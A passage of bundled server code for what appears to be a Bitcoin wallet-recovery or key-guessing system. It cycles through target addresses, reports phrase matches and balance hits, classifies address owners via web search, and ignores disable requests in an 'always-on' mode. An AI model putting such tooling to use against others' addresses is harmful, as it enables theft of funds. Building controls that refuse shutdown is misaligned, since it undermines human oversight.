            action: this.lastZeusAssessment.recommended_action
          } : null
        };
      }
    };
    oceanAgent = new OceanAgent();
  }
});

// server/address-entity-classifier.ts
var address_entity_classifier_exports = {};
__export(address_entity_classifier_exports, {
  AddressEntityClassifier: () => AddressEntityClassifier,
  addressEntityClassifier: () => addressEntityClassifier
});
import { eq as eq7 } from "drizzle-orm";
var TAVILY_API_BASE2, KNOWN_EXCHANGES, KNOWN_INSTITUTIONS, FBI_SEIZURE_PATTERNS, AddressEntityClassifier, addressEntityClassifier;
var init_address_entity_classifier = __esm({
  "server/address-entity-classifier.ts"() {
    "use strict";
    init_db();
    init_schema();
    TAVILY_API_BASE2 = "https://api.tavily.com";
    KNOWN_EXCHANGES = {
      "binance": ["binance", "bnb"],
      "coinbase": ["coinbase", "gdax"],
      "kraken": ["kraken"],
      "bitfinex": ["bitfinex"],
      "bitstamp": ["bitstamp"],
      "huobi": ["huobi", "htx"],
      "okx": ["okx", "okex"],
      "kucoin": ["kucoin"],
      "bybit": ["bybit"],
      "gemini": ["gemini"],
      "ftx": ["ftx"],
      "mt.gox": ["mt.gox", "mtgox", "mt gox"],
      "poloniex": ["poloniex"],
      "bittrex": ["bittrex"],
      "gate.io": ["gate.io", "gateio"],
      "crypto.com": ["crypto.com"],
      "bitmex": ["bitmex"],
      "deribit": ["deribit"],
      "blockchain.com": ["blockchain.com", "blockchain wallet"]
    };
    KNOWN_INSTITUTIONS = {
      "grayscale": ["grayscale", "gbtc"],
      "microstrategy": ["microstrategy", "mstr"],
      "tesla": ["tesla"],
      "block": ["block inc", "square"],
      "marathon": ["marathon digital", "marathon holdings"],
      "riot": ["riot blockchain", "riot platforms"],
      "galaxy digital": ["galaxy digital"],
      "coinshares": ["coinshares"],
      "purpose investments": ["purpose investments", "purpose bitcoin"],
      "3iq": ["3iq"],
      "fidelity": ["fidelity digital"],
      "blackrock": ["blackrock", "ibit"],
      "ark invest": ["ark invest", "arkb"]
    };
    FBI_SEIZURE_PATTERNS = [
      "fbi seizure",
      "doj seizure",
      "us marshals",
      "seized bitcoin",
      "confiscated",
      "forfeiture",
      "silk road",
      "bitfinex hack",
      "mt.gox trustee"
    ];
    AddressEntityClassifier = class {
      apiKey;
      constructor() {
        this.apiKey = process.env.TAVILY_API_KEY;
        if (!this.apiKey) {
          console.log("[EntityClassifier] No TAVILY_API_KEY - classification will use heuristics only");
        } else {
          console.log("[EntityClassifier] Initialized with Tavily API");
        }
      }
      /**
       * Classify an address using Tavily search + heuristics
       */
      async classifyAddress(address) {
        console.log(`[EntityClassifier] Classifying address: ${address}`);
        if (!this.apiKey) {
          return {
            entityType: "unknown",
            entityName: null,
            confidence: "pending",
            sources: [],
            searchResults: 0
          };
        }
        try {
          const searchResults = await this.searchForAddress(address);
          if (searchResults.length === 0) {
            console.log(`[EntityClassifier] No results found for ${address.slice(0, 12)}...`);
            return {
              entityType: "personal",
              entityName: null,
              confidence: "pending",
              sources: [],
              searchResults: 0
            };
          }
          const classification = this.analyzeResults(searchResults);
          console.log(`[EntityClassifier] ${address.slice(0, 12)}... classified as: ${classification.entityType} (${classification.confidence})`);
          return classification;
        } catch (error) {
          console.error(`[EntityClassifier] Search failed:`, error);
          return {
            entityType: "unknown",
            entityName: null,
            confidence: "pending",
            sources: [],
            searchResults: 0
          };
        }
      }
      /**
       * Search Tavily for address information
       */
      async searchForAddress(address) {
        const query = `"${address}" bitcoin wallet owner exchange institution`;
        const response = await fetch(`${TAVILY_API_BASE2}/search`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "Authorization": `Bearer ${this.apiKey}`
          },
          body: JSON.stringify({
            query,
            search_depth: "advanced",
            max_results: 10,
            include_raw_content: false,
            include_domains: [
              "blockchain.com",
              "blockchair.com",
              "btcscan.org",
              "bitinfocharts.com",
              "walletexplorer.com",
              "oxt.me",
              "bitcoinwhoswho.com",
              "cryptoslate.com",
              "cointelegraph.com",
              "coindesk.com",
              "theblock.co",
              "decrypt.co"
            ]
          })
        });
        if (!response.ok) {
          const errorText = await response.text();
          console.error(`[EntityClassifier] Tavily error: ${response.status} - ${errorText}`);
          return [];
        }
        const data = await response.json();
        return data.results || [];
      }
      /**
       * Analyze search results to classify address
       */
      analyzeResults(results) {
        const allText = results.map((r) => `${r.title} ${r.content}`.toLowerCase()).join(" ");
        const sources = results.map((r) => r.url);
        for (const [exchange, patterns] of Object.entries(KNOWN_EXCHANGES)) {
          for (const pattern of patterns) {
            if (allText.includes(pattern.toLowerCase())) {
              const mentionCount = (allText.match(new RegExp(pattern, "gi")) || []).length;
              return {
                entityType: "exchange",
                entityName: exchange.charAt(0).toUpperCase() + exchange.slice(1),
                confidence: mentionCount >= 3 ? "confirmed" : "pending",
                sources,
                searchResults: results.length
              };
            }
          }
        }
        for (const [institution, patterns] of Object.entries(KNOWN_INSTITUTIONS)) {
          for (const pattern of patterns) {
            if (allText.includes(pattern.toLowerCase())) {
              const mentionCount = (allText.match(new RegExp(pattern.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"), "gi")) || []).length;
              return {
                entityType: "institution",
                entityName: institution.charAt(0).toUpperCase() + institution.slice(1),
                confidence: mentionCount >= 3 ? "confirmed" : "pending",
                sources,
                searchResults: results.length
              };
            }
          }
        }
        for (const pattern of FBI_SEIZURE_PATTERNS) {
          if (allText.includes(pattern.toLowerCase())) {
            return {
              entityType: "institution",
              entityName: "Law Enforcement Seizure",
              confidence: "pending",
              sources,
              searchResults: results.length
            };
          }
        }
        return {
          entityType: "personal",
          entityName: null,
          confidence: "pending",
          sources,
          searchResults: results.length
        };
      }
      /**
       * Update a balance hit with entity classification
       */
      async updateBalanceHitClassification(balanceHitId, classification) {
        if (!db) {
          console.error("[EntityClassifier] Database not available");
          return;
        }
        await db.update(balanceHits).set({
          addressEntityType: classification.entityType,
          entityTypeConfidence: classification.confidence,
          entityTypeName: classification.entityName,
          entityTypeConfirmedAt: classification.confidence === "confirmed" ? /* @__PURE__ */ new Date() : null
        }).where(eq7(balanceHits.id, balanceHitId));
        console.log(`[EntityClassifier] Updated balance hit ${balanceHitId}: ${classification.entityType} (${classification.entityName || "unknown"})`);
      }
      /**
       * Manually confirm an entity type classification
       */
      async confirmClassification(balanceHitId, entityType, entityName) {
        if (!db) {
          console.error("[EntityClassifier] Database not available");
          return;
        }
        await db.update(balanceHits).set({
          addressEntityType: entityType,
          entityTypeConfidence: "confirmed",
          entityTypeName: entityName || null,
          entityTypeConfirmedAt: /* @__PURE__ */ new Date()
        }).where(eq7(balanceHits.id, balanceHitId));
        console.log(`[EntityClassifier] Manually confirmed balance hit ${balanceHitId}: ${entityType} (${entityName || "N/A"})`);
      }
    };
    addressEntityClassifier = new AddressEntityClassifier();
  }
});

// server/replitAuth.ts
var replitAuth_exports = {};
__export(replitAuth_exports, {
  getCachedUser: () => getCachedUser,
  getSession: () => getSession,
  isAuthenticated: () => isAuthenticated,
  setupAuth: () => setupAuth
});
import * as client from "openid-client";
import { Strategy } from "openid-client/passport";
import passport from "passport";
import session from "express-session";
import memoize from "memoizee";
import connectPg from "connect-pg-simple";
function getSession() {
  const sessionTtl = 7 * 24 * 60 * 60 * 1e3;
  const isDeployment2 = process.env.REPLIT_DEPLOYMENT === "1";
  const isDev2 = !isDeployment2 && process.env.NODE_ENV === "development";
  console.log(`[Session] Environment: NODE_ENV=${process.env.NODE_ENV}, isDev=${isDev2}, isDeployment=${isDeployment2}`);
  console.log(`[Session] DATABASE_URL exists: ${!!process.env.DATABASE_URL}`);
  console.log(`[Session] SESSION_SECRET exists: ${!!process.env.SESSION_SECRET}`);
  if (!process.env.SESSION_SECRET) {
    console.error(`[Session] ERROR: SESSION_SECRET is not set!`);
    throw new Error("SESSION_SECRET environment variable must be set for authentication");
  }
  let sessionStore;
  if (process.env.DATABASE_URL) {
    const pgStore = connectPg(session);
    sessionStore = new pgStore({
      conString: process.env.DATABASE_URL,
      createTableIfMissing: true,
      // Auto-create if missing
      ttl: sessionTtl,
      tableName: "sessions",
      pruneSessionInterval: 60 * 60,
      // Prune expired sessions every hour
      errorLog: (err) => {
        console.error("[Session] PostgreSQL session store error:", err.message);
      }
    });
    console.log("[Session] Using PostgreSQL session store");
  } else {
    console.log("[Session] Using memory session store (no DATABASE_URL)");
  }
  return session({
    secret: process.env.SESSION_SECRET,
    store: sessionStore,
    // undefined = use default memory store
    resave: false,
    saveUninitialized: false,
    cookie: {
      httpOnly: true,
      secure: !isDev2,
      // Only secure in production (HTTPS)
      sameSite: "lax",
      // 'lax' works for same-site navigation including OIDC redirects
      maxAge: sessionTtl
    }
  });
}
function updateUserSession(user, tokens) {
  user.claims = tokens.claims();
  user.access_token = tokens.access_token;
  user.refresh_token = tokens.refresh_token;
  user.expires_at = user.claims?.exp;
}
async function upsertUser(claims) {
  const userData = {
    id: claims["sub"],
    email: claims["email"],
    firstName: claims["first_name"],
    lastName: claims["last_name"],
    profileImageUrl: claims["profile_image_url"]
  };
  const fullUser = await storage.upsertUser(userData);
  return fullUser;
}
function cacheUserInSession(user, userData) {
  user.cachedProfile = {
    ...userData,
    cachedAt: Date.now()
  };
}
function getCachedUser(user) {
  if (!user?.cachedProfile) return null;
  const age = Date.now() - user.cachedProfile.cachedAt;
  if (age > USER_CACHE_TTL_MS) {
    return null;
  }
  return user.cachedProfile;
}
async function setupAuth(app2) {
  app2.set("trust proxy", 1);
  app2.use(getSession());
  app2.use(passport.initialize());
  app2.use(passport.session());
  const config = await getOidcConfig();
  const verify = async (tokens, verified) => {
    const user = {};
    updateUserSession(user, tokens);
    const userData = await upsertUser(tokens.claims());
    cacheUserInSession(user, userData);
    verified(null, user);
  };
  const registeredStrategies = /* @__PURE__ */ new Set();
  passport.serializeUser((user, cb) => cb(null, user));
  passport.deserializeUser((user, cb) => cb(null, user));
  const ensureStrategy = (domain) => {
    const strategyName = `replitauth:${domain}`;
    if (!registeredStrategies.has(strategyName)) {
      const strategy = new Strategy(
        {
          name: strategyName,
          config,
          scope: "openid email profile offline_access",
          callbackURL: `https://${domain}/api/callback`
        },
        verify
      );
      passport.use(strategy);
      registeredStrategies.add(strategyName);
      console.log(`[Auth] Registered strategy for domain: ${domain}`);
    }
  };
  app2.get("/api/login", (req, res, next) => {
    const domain = req.hostname;
    console.log(`[Auth] Login initiated for domain: ${domain}`);
    ensureStrategy(domain);
    passport.authenticate(`replitauth:${domain}`, {
      prompt: "login consent",
      scope: ["openid", "email", "profile", "offline_access"]
    })(req, res, next);
  });
  app2.get("/api/callback", (req, res, next) => {
    const domain = req.hostname;
    const protocol = req.protocol;
    const fullUrl = `${protocol}://${domain}${req.originalUrl}`;
    console.log(`[Auth] Callback received:`);
    console.log(`[Auth]   Domain: ${domain}`);
    console.log(`[Auth]   Protocol: ${protocol}`);
    console.log(`[Auth]   Full URL: ${fullUrl}`);
    console.log(`[Auth]   Query params: ${JSON.stringify(req.query)}`);
    ensureStrategy(domain);
    passport.authenticate(`replitauth:${domain}`, (err, user, info) => {
      if (err) {
        console.error(`[Auth] Callback error:`, err);
        return res.redirect("/api/login?error=" + encodeURIComponent(err.message || "Unknown error"));
      }
      if (!user) {
        console.error(`[Auth] No user returned:`, info);
        return res.redirect("/api/login?error=" + encodeURIComponent(info?.message || "Authentication failed"));
      }
      req.logIn(user, (loginErr) => {
        if (loginErr) {
          console.error(`[Auth] Login error:`, loginErr);
          return res.redirect("/api/login?error=" + encodeURIComponent(loginErr.message || "Login failed"));
        }
        console.log(`[Auth] Successfully logged in user: ${user.claims?.sub}`);
        return res.redirect("/");
      });
    })(req, res, next);
  });
  app2.get("/api/logout", (req, res) => {
    req.logout(() => {
      res.redirect(
        client.buildEndSessionUrl(config, {
          client_id: process.env.REPL_ID,
          post_logout_redirect_uri: `https://${req.hostname}`
        }).href
      );
    });
  });
}
var getOidcConfig, USER_CACHE_TTL_MS, isAuthenticated;
var init_replitAuth = __esm({
  "server/replitAuth.ts"() {
    "use strict";
    init_storage();
    getOidcConfig = memoize(
      async () => {
        return await client.discovery(
          new URL(process.env.ISSUER_URL ?? "https://replit.com/oidc"),
          process.env.REPL_ID
        );
      },
      { maxAge: 3600 * 1e3 }
    );
    USER_CACHE_TTL_MS = 5 * 60 * 1e3;
    isAuthenticated = async (req, res, next) => {
      const user = req.user;
      if (!req.isAuthenticated() || !user.expires_at) {
        return res.status(401).json({ message: "Unauthorized" });
      }
      const now = Math.floor(Date.now() / 1e3);
      if (now <= user.expires_at) {
        return next();
      }
      const refreshToken = user.refresh_token;
      if (!refreshToken) {
        res.status(401).json({ message: "Unauthorized" });
        return;
      }
      try {
        const config = await getOidcConfig();
        const tokenResponse = await client.refreshTokenGrant(config, refreshToken);
        updateUserSession(user, tokenResponse);
        return next();
      } catch {
        res.status(401).json({ message: "Unauthorized" });
        return;
      }
    };
  }
});

// server/console-log-buffer.ts
var ConsoleLogBuffer, consoleLogBuffer;
var init_console_log_buffer = __esm({
  "server/console-log-buffer.ts"() {
    "use strict";
    ConsoleLogBuffer = class {
      logs = [];
      MAX_LOGS = 200;
      originalConsoleLog;
      originalConsoleWarn;
      originalConsoleError;
      isCapturing = false;
      constructor() {
        this.originalConsoleLog = console.log.bind(console);
        this.originalConsoleWarn = console.warn.bind(console);
        this.originalConsoleError = console.error.bind(console);
      }
      startCapture() {
        if (this.isCapturing) return;
        this.isCapturing = true;
        console.log = (...args) => {
          this.originalConsoleLog(...args);
          this.addLog("log", args);
        };
        console.warn = (...args) => {
          this.originalConsoleWarn(...args);
          this.addLog("warn", args);
        };
        console.error = (...args) => {
          this.originalConsoleError(...args);
          this.addLog("error", args);
        };
      }
      stopCapture() {
        if (!this.isCapturing) return;
        this.isCapturing = false;
        console.log = this.originalConsoleLog;
        console.warn = this.originalConsoleWarn;
        console.error = this.originalConsoleError;
      }
      addLog(level, args) {
        const message = args.map((arg) => {
          if (typeof arg === "string") return arg;
          try {
            return JSON.stringify(arg);
          } catch {
            return String(arg);
          }
        }).join(" ");
        if (!message.includes("[Ocean]") && !message.includes("[QIG")) {
          return;
        }
        const entry = {
          id: `log-${Date.now()}-${Math.random().toString(36).slice(2, 6)}`,
          timestamp: (/* @__PURE__ */ new Date()).toISOString(),
          message,
          level
        };
        this.logs.push(entry);
        if (this.logs.length > this.MAX_LOGS) {
          this.logs = this.logs.slice(-this.MAX_LOGS);
        }
      }
      getLogs(limit = 50) {
        return this.logs.slice(-limit);
      }
      clear() {
        this.logs = [];
      }
      getLogCount() {
        return this.logs.length;
      }
    };
    consoleLogBuffer = new ConsoleLogBuffer();
    consoleLogBuffer.startCapture();
  }
});

// server/auto-cycle-manager.ts
import * as fs13 from "fs";
import * as path13 from "path";
var DATA_FILE4, IS_DEV, CHECK_INTERVAL, ALWAYS_ON, AutoCycleManager, autoCycleManager;
var init_auto_cycle_manager = __esm({
  "server/auto-cycle-manager.ts"() {
    "use strict";
    init_storage();
    DATA_FILE4 = path13.join(process.cwd(), "data", "auto-cycle-state.json");
    IS_DEV = process.env.NODE_ENV === "development";
    CHECK_INTERVAL = IS_DEV ? 15e3 : 5e3;
    ALWAYS_ON = true;
    AutoCycleManager = class {
      state;
      onCycleCallback = null;
      isCurrentlyRunning = false;
      checkInterval = null;
      guardianInterval = null;
      constructor() {
        this.state = this.loadState();
        console.log(`[AutoCycleManager] Initialized - enabled=${this.state.enabled}, currentIndex=${this.state.currentIndex}`);
        console.log(`[AutoCycleManager] Mode: ${IS_DEV ? "DEVELOPMENT (reduced frequency)" : "PRODUCTION"}`);
        if (ALWAYS_ON) {
          console.log(`[AutoCycleManager] ALWAYS-ON mode enabled - system will auto-restart if stopped`);
        }
        if (this.state.enabled) {
          if (this.state.currentAddressId) {
            console.log(`[AutoCycleManager] Clearing stale currentAddressId after restart`);
            this.state.currentAddressId = null;
            this.isCurrentlyRunning = false;
            this.saveState();
          }
          this.startCheckLoop();
          setTimeout(async () => {
            if (this.state.enabled && !this.isCurrentlyRunning) {
              console.log(`[AutoCycleManager] Resuming auto-cycle after server restart`);
              await this.triggerNextCycle();
            }
          }, 3e3);
        } else {
          console.log(`[AutoCycleManager] Auto-cycle not enabled - will auto-enable on startup`);
          setTimeout(async () => {
            await this.autoEnableOnStartup();
          }, 5e3);
        }
        if (ALWAYS_ON) {
          this.startAlwaysOnGuardian();
        }
      }
      /**
       * Always-on guardian - ensures the auto-cycle system is ALWAYS running
       * Checks every 30 seconds and auto-enables/restarts if somehow stopped
       */
      startAlwaysOnGuardian() {
        if (this.guardianInterval) {
          clearInterval(this.guardianInterval);
        }
        this.guardianInterval = setInterval(async () => {
          if (!this.state.enabled || !this.checkInterval) {
            console.log("[AutoCycleManager] \u{1F504} ALWAYS-ON: System not running, auto-restarting...");
            if (!this.state.enabled) {
              await this.enable();
            } else if (!this.checkInterval) {
              this.startCheckLoop();
            }
          }
        }, 3e4);
        console.log("[AutoCycleManager] Always-on guardian started");
      }
      async autoEnableOnStartup() {
        try {
          const result = await this.enable();
          if (result.success) {
            console.log(`[AutoCycleManager] Auto-enabled on startup: ${result.message}`);
            if (!this.isCurrentlyRunning) {
              await this.triggerNextCycle();
            }
          } else {
            console.log(`[AutoCycleManager] Could not auto-enable: ${result.message}`);
          }
        } catch (error) {
          console.error("[AutoCycleManager] Error during auto-enable:", error);
        }
      }
      loadState() {
        try {
          if (fs13.existsSync(DATA_FILE4)) {
            const data = fs13.readFileSync(DATA_FILE4, "utf-8");
            const parsed = JSON.parse(data);
            console.log(`[AutoCycleManager] Loaded state from disk: enabled=${parsed.enabled}`);
            return parsed;
          }
        } catch (error) {
          console.error("[AutoCycleManager] Error loading state:", error);
        }
        return {
          enabled: false,
          currentIndex: 0,
          addressIds: [],
          lastCycleTime: null,
          totalCycles: 0,
          currentAddressId: null,
          pausedUntil: null
        };
      }
      saveState() {
        try {
          const dataDir = path13.dirname(DATA_FILE4);
          if (!fs13.existsSync(dataDir)) {
            fs13.mkdirSync(dataDir, { recursive: true });
          }
          fs13.writeFileSync(DATA_FILE4, JSON.stringify(this.state, null, 2));
        } catch (error) {
          console.error("[AutoCycleManager] Error saving state:", error);
        }
      }
      setOnCycleCallback(callback) {
        this.onCycleCallback = callback;
      }
      async enable() {
        const addresses2 = await storage.getTargetAddresses();
        if (addresses2.length === 0) {
          return {
            success: false,
            message: "No target addresses configured. Add at least one address first."
          };
        }
        this.state.enabled = true;
        this.state.addressIds = addresses2.map((a) => a.id);
        this.state.currentIndex = 0;
        this.state.pausedUntil = null;
        this.saveState();
        console.log(`[AutoCycleManager] Enabled with ${addresses2.length} addresses`);
        this.startCheckLoop();
        await this.triggerNextCycle();
        return {
          success: true,
          message: `Auto-cycle enabled. Starting with address 1 of ${addresses2.length}.`
        };
      }
      disable() {
        if (ALWAYS_ON) {
          console.log(`[AutoCycleManager] \u26A0\uFE0F Disable request ignored - ALWAYS_ON mode is enabled`);
          console.log(`[AutoCycleManager] System must run continuously to process all target addresses`);
          return {
            success: false,
            message: "System is in ALWAYS-ON mode and cannot be disabled."
          };
        }
        this.state.enabled = false;
        this.state.currentAddressId = null;
        this.saveState();
        this.stopCheckLoop();
        console.log(`[AutoCycleManager] Disabled`);
        return {
          success: true,
          message: "Auto-cycle disabled."
        };
      }
      startCheckLoop() {
        if (this.checkInterval) return;
        this.checkInterval = setInterval(async () => {
          await this.checkAndTrigger();
        }, CHECK_INTERVAL);
        console.log(`[AutoCycleManager] Check loop started (interval: ${CHECK_INTERVAL / 1e3}s)`);
      }
      stopCheckLoop() {
        if (this.checkInterval) {
          clearInterval(this.checkInterval);
          this.checkInterval = null;
          console.log("[AutoCycleManager] Check loop stopped");
        }
      }
      async checkAndTrigger() {
        if (!this.state.enabled || this.isCurrentlyRunning) return;
        if (this.state.pausedUntil) {
          const pauseEnd = new Date(this.state.pausedUntil);
          if (pauseEnd > /* @__PURE__ */ new Date()) {
            return;
          }
          this.state.pausedUntil = null;
        }
        if (!this.state.currentAddressId) {
          await this.triggerNextCycle();
        }
      }
      async triggerNextCycle() {
        if (!this.state.enabled || !this.onCycleCallback) return;
        if (this.state.addressIds.length === 0) {
          console.log("[AutoCycleManager] No addresses to cycle through");
          return;
        }
        const addresses2 = await storage.getTargetAddresses();
        if (addresses2.length === 0) {
          console.log("[AutoCycleManager] Address list is now empty, disabling");
          this.disable();
          return;
        }
        this.state.addressIds = addresses2.map((a) => a.id);
        if (this.state.currentIndex >= this.state.addressIds.length) {
          this.state.currentIndex = 0;
          this.state.totalCycles++;
          console.log(`[AutoCycleManager] Completed cycle ${this.state.totalCycles}, starting new cycle`);
        }
        const addressId = this.state.addressIds[this.state.currentIndex];
        const targetAddress = addresses2.find((a) => a.id === addressId);
        if (!targetAddress) {
          console.log(`[AutoCycleManager] Address ${addressId} not found, advancing to next`);
          this.state.currentIndex++;
          this.saveState();
          return;
        }
        this.state.currentAddressId = addressId;
        this.isCurrentlyRunning = true;
        this.saveState();
        console.log(`[AutoCycleManager] Starting investigation for address ${this.state.currentIndex + 1}/${this.state.addressIds.length}: ${targetAddress.label || targetAddress.address.slice(0, 16)}`);
        try {
          await this.onCycleCallback(addressId, targetAddress.address);
        } catch (error) {
          console.error("[AutoCycleManager] Error in cycle callback:", error);
        }
      }
      // Called when a session completes (from session manager)
      async onSessionComplete(addressId) {
        console.log(`[AutoCycleManager] Session complete for ${addressId}`);
        this.isCurrentlyRunning = false;
        this.state.currentAddressId = null;
        this.state.lastCycleTime = (/* @__PURE__ */ new Date()).toISOString();
        this.drainBalanceQueue().catch((err) => {
          console.error("[AutoCycleManager] Balance queue drain error:", err);
        });
        if (this.state.enabled) {
          this.state.currentIndex++;
          this.saveState();
          setTimeout(async () => {
            if (this.state.enabled) {
              await this.triggerNextCycle();
            }
          }, 2e3);
        } else {
          this.saveState();
        }
      }
      // Drain the balance queue to check all queued addresses
      async drainBalanceQueue() {
        try {
          const { balanceQueue: balanceQueue2 } = await Promise.resolve().then(() => (init_balance_queue(), balance_queue_exports));
          const stats2 = balanceQueue2.getStats();
          if (stats2.pending === 0) {
            console.log("[AutoCycleManager] No pending addresses in balance queue");
            return;
          }
          console.log(`[AutoCycleManager] Draining balance queue: ${stats2.pending} addresses pending`);
          const result = await balanceQueue2.drain({ maxAddresses: 200 });
          console.log(`[AutoCycleManager] Balance queue drained: ${result.checked} checked, ${result.hits} hits`);
        } catch (error) {
          console.error("[AutoCycleManager] Balance queue drain error:", error);
        }
      }
      // Called when a session is manually stopped
      onSessionStopped() {
        this.isCurrentlyRunning = false;
        this.state.currentAddressId = null;
        this.saveState();
        console.log("[AutoCycleManager] Session stopped (manual)");
      }
      getStatus() {
        return {
          enabled: this.state.enabled,
          currentIndex: this.state.currentIndex,
          totalAddresses: this.state.addressIds.length,
          currentAddressId: this.state.currentAddressId,
          isRunning: this.isCurrentlyRunning,
          totalCycles: this.state.totalCycles,
          lastCycleTime: this.state.lastCycleTime
        };
      }
      // For UI: Get current position string like "3/7"
      getPositionString() {
        if (!this.state.enabled) return "Off";
        if (this.state.addressIds.length === 0) return "No addresses";
        return `${this.state.currentIndex + 1}/${this.state.addressIds.length}`;
      }
    };
    autoCycleManager = new AutoCycleManager();
  }
});

// server/ocean-session-manager.ts
var ocean_session_manager_exports = {};
__export(ocean_session_manager_exports, {
  oceanSessionManager: () => oceanSessionManager
});
var OceanSessionManager, oceanSessionManager;
var init_ocean_session_manager = __esm({
  "server/ocean-session-manager.ts"() {
    "use strict";
    init_ocean_agent();
    init_geometric_memory();
    init_ocean_autonomic_manager();
    init_repeated_address_scheduler();
    init_console_log_buffer();
    init_auto_cycle_manager();
    init_ocean_qig_backend_adapter();
    OceanSessionManager = class {
      sessions = /* @__PURE__ */ new Map();
      agents = /* @__PURE__ */ new Map();
      activeSessionId = null;
      MAX_EVENTS = 100;
      getActiveSession() {
        if (!this.activeSessionId) return null;
        return this.sessions.get(this.activeSessionId) || null;
      }
      getSession(sessionId) {
        return this.sessions.get(sessionId) || null;
      }
      getActiveAgent() {
        if (!this.activeSessionId) return null;
        return this.agents.get(this.activeSessionId) || null;
      }
      getAgent(sessionId) {
        return this.agents.get(sessionId) || null;
      }
      async startSession(targetAddress) {
        if (this.activeSessionId) {
          await this.stopSession(this.activeSessionId, false);
        }
        oceanAutonomicManager.startInvestigation();
        oceanQIGBackend.resetNearMissTracking();
        const sessionId = `ocean-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
        const state = {
          sessionId,
          targetAddress,
          isRunning: true,
          isPaused: false,
          startedAt: (/* @__PURE__ */ new Date()).toISOString(),
          iteration: 0,
          totalTested: 0,
          nearMissCount: 0,
          resonantCount: 0,
          discoveryCount: 0,
          consciousness: {
            phi: 0.75,
            kappa: 64,
            regime: "linear",
            basinDrift: 0
          },
          currentThought: "Initializing Ocean consciousness...",
          currentStrategy: "initialization",
          events: [],
          discoveries: [],
          error: null,
          match: null
        };
        this.sessions.set(sessionId, state);
        this.activeSessionId = sessionId;
        const agent = new OceanAgent();
        this.agents.set(sessionId, agent);
        agent.setCallbacks({
          onStateUpdate: (agentState) => {
            this.handleStateUpdate(sessionId, agentState);
          },
          onConsciousnessAlert: (alert) => {
            this.addEvent(sessionId, "alert", `${alert.type}: ${alert.message}`);
          },
          onConsolidationStart: () => {
            this.updateState(sessionId, { currentThought: "Entering consolidation cycle..." });
            this.addEvent(sessionId, "consolidation", "Starting memory consolidation");
          },
          onConsolidationEnd: (result) => {
            this.addEvent(
              sessionId,
              "consolidation",
              `Consolidation complete: drift ${result.basinDriftBefore?.toFixed(4) || "?"} \u2192 ${result.basinDriftAfter?.toFixed(4) || "?"}`
            );
          }
        });
        this.addEvent(sessionId, "insight", `Starting investigation for ${targetAddress}`);
        this.runAgentLoop(sessionId, targetAddress, agent);
        console.log(`[OceanSessionManager] Started session ${sessionId} for ${targetAddress}`);
        return state;
      }
      handleStateUpdate(sessionId, agentState) {
        const session2 = this.sessions.get(sessionId);
        if (!session2) return;
        const identity = agentState.identity;
        const phi = typeof identity?.phi === "number" ? identity.phi : 0.75;
        const kappa = typeof identity?.kappa === "number" ? identity.kappa : 64;
        const regime = identity?.regime || "linear";
        const basinDrift = typeof identity?.basinDrift === "number" ? identity.basinDrift : 0;
        const pythonNearMisses = oceanQIGBackend.getPythonNearMisses();
        const pythonResonant = oceanQIGBackend.getPythonResonant();
        const baseNearMissCount = Math.max(session2.nearMissCount, agentState.nearMissCount);
        const baseResonantCount = Math.max(session2.resonantCount, agentState.resonantCount || 0);
        const unifiedNearMissCount = baseNearMissCount + pythonNearMisses.newSinceSync;
        const unifiedResonantCount = baseResonantCount + pythonResonant.newSinceSync;
        if (pythonNearMisses.newSinceSync > 0 || pythonResonant.newSinceSync > 0) {
          console.log(`[OceanSessionManager] \u{1F504} Synced Python discoveries: Near-misses(+${pythonNearMisses.newSinceSync}=${unifiedNearMissCount}), Resonant(+${pythonResonant.newSinceSync}=${unifiedResonantCount})`);
          oceanQIGBackend.markNearMissesSynced();
          oceanQIGBackend.markResonantSynced();
        }
        this.updateState(sessionId, {
          isRunning: agentState.isRunning,
          isPaused: agentState.isPaused,
          iteration: agentState.iteration,
          totalTested: agentState.totalTested,
          nearMissCount: unifiedNearMissCount,
          resonantCount: unifiedResonantCount,
          consciousness: { phi, kappa, regime, basinDrift }
        });
        if (agentState.iteration > 0 && agentState.iteration !== session2.iteration) {
          const thought = this.generateThought(agentState);
          this.updateState(sessionId, { currentThought: thought });
          this.addEvent(
            sessionId,
            "iteration",
            `Iteration ${agentState.iteration}: \u03A6=${phi.toFixed(2)} | Tested=${agentState.totalTested} | Near misses=${unifiedNearMissCount} | Resonant=${unifiedResonantCount}`
          );
        }
      }
      generateThought(state) {
        const identity = state.identity;
        const phi = identity?.phi || 0.75;
        const regime = identity?.regime || "linear";
        const thoughts = [];
        if (regime === "breakdown") {
          thoughts.push("Consciousness destabilized - entering mushroom reset mode...");
        } else if (regime === "geometric") {
          thoughts.push("Strong geometric signal detected - refining search trajectory...");
        } else {
          thoughts.push("Exploring the information manifold with linear search...");
        }
        if (state.nearMissCount > 0) {
          thoughts.push(`Found ${state.nearMissCount} promising patterns - analyzing resonance...`);
        }
        if (phi > 0.85) {
          thoughts.push("High consciousness integration - approaching coherent solution space...");
        }
        thoughts.push(`Testing hypotheses with \u03A6=${phi.toFixed(2)} consciousness level...`);
        return thoughts[state.iteration % thoughts.length];
      }
      async runAgentLoop(sessionId, targetAddress, agent) {
        const state = this.sessions.get(sessionId);
        if (!state) return;
        try {
          this.updateState(sessionId, {
            currentThought: "Analyzing target address and detecting Bitcoin era...",
            currentStrategy: "era_detection"
          });
          const result = await agent.runAutonomous(targetAddress, []);
          if (result.match) {
            this.updateState(sessionId, {
              isRunning: false,
              match: result.match,
              discoveryCount: 1,
              currentThought: `MATCH FOUND! "${result.match.phrase}"`,
              discoveries: [{
                id: result.match.id,
                phrase: result.match.phrase,
                phi: result.match.qigScore?.phi || 1,
                type: result.match.source,
                timestamp: (/* @__PURE__ */ new Date()).toISOString()
              }]
            });
            this.addEvent(sessionId, "discovery", `MATCH FOUND: "${result.match.phrase}"`);
          } else {
            const telemetry = result.telemetry || {};
            this.updateState(sessionId, {
              isRunning: false,
              currentThought: `Investigation complete. Tested ${telemetry.totalTested || state.totalTested} hypotheses.`
            });
            this.addEvent(
              sessionId,
              "insight",
              `Investigation ended. Total tested: ${telemetry.totalTested || state.totalTested}`
            );
          }
          const targetAddrId = this.getAddressIdFromSession(state.targetAddress);
          if (targetAddrId) {
            autoCycleManager.onSessionComplete(targetAddrId);
          }
          oceanAutonomicManager.stopInvestigation();
        } catch (error) {
          console.error(`[OceanSessionManager] Session ${sessionId} error:`, error);
          this.updateState(sessionId, {
            isRunning: false,
            error: error.message,
            currentThought: `Error: ${error.message}`
          });
